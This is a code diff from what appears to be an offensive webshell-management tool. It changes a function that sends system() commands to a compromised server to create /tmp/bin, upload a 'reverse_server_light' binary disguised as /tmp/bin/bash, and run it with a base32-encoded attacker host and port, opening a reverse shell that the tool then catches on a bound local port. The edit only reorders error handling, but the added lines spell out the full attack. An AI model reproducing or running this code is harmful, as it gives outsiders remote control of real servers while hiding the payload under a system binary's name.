@@ -24,10 +24,11 @@ def run(lhost: str, port: int):
     print(color.yellow(f"Waring: You are using a testing command...."))
     print(color.yellow(f"        Please make sure Port {port} open...."))
     send("system('mkdir /tmp/bin');")
-    if upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/bin/bash", True):
-        t = Thread(target=delay_send, args=(2, "system('cd /tmp && chmod +x bin/bash && bin/bash %s');" % b32encode(f"{lhost} {port}".encode()).decode()))
-        t.setDaemon(True)
-        t.start()
+    if not upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/bin/bash", True):
+        return
+    t = Thread(target=delay_send, args=(2, "system('cd /tmp && chmod +x bin/bash && bin/bash %s');" % b32encode(f"{lhost} {port}".encode()).decode()))
+    t.setDaemon(True)
+    t.start()
     print(f"Bind port {color.yellow(str(port))}...\n")
     if (not bind(port)):
         print(color.red(f"Bind port error."))
